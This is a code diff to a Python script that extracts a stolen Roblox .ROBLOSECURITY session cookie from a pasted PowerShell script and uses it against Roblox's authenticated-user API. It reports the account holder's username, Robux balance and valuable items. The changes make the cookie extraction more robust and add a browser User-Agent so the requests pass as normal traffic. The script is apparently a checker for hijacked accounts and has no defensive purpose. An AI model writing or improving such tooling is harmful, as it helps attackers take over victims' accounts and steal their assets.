@@ -26,7 +26,7 @@ def main():
         id_match = re.search(r'/(\d+)/|id=(\d+)', target_url)
         asset_id = id_match.group(1) or id_match.group(2) if id_match else "126531364524013"
 
-        # 2. Robust .ROBLOSECURITY Cookie Extraction (Handles PowerShell escapes and warning prefix)
+        # 2. Extract and Sanitize .ROBLOSECURITY Cookie
         cookie_match = re.search(r'\.ROBLOSECURITY\s*=\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
         if not cookie_match:
             cookie_match = re.search(r'\.ROBLOSECURITY["\']?\s*,\s*["\']?(_\|WARNING:[^"\'\s;]+|[A-Za-z0-9_\-\.%\|]+)["\']?', decoded_script, re.IGNORECASE)
@@ -37,9 +37,9 @@ def main():
             print("ERROR: Could not find .ROBLOSECURITY cookie in the pasted PowerShell script.")
             return
 
-        # Unescape any PowerShell/JSON escape characters if present
-        roblosecurity = roblosecurity.replace('\\|', '|').strip()
-        print(f"[+] Cookie extracted successfully! Preview: {roblosecurity[:30]}... (Length: {len(roblosecurity)})")
+        # Deep sanitize: remove surrounding quotes, escape characters, and whitespace
+        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
+        print(f"[+] Cookie sanitized! Length: {len(roblosecurity)}")
 
         username = "Unknown User"
         robux_balance = 0
@@ -48,7 +48,10 @@ def main():
         has_headless = "False"
         cookie_status = "🔴 Invalid / Expired"
 
-        headers = { "Cookie": f".ROBLOSECURITY={roblosecurity}" }
+        headers = { 
+            "Cookie": f".ROBLOSECURITY={roblosecurity}",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
 
         user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
         print(f"[*] Roblox Auth API status: {user_res.status_code}")
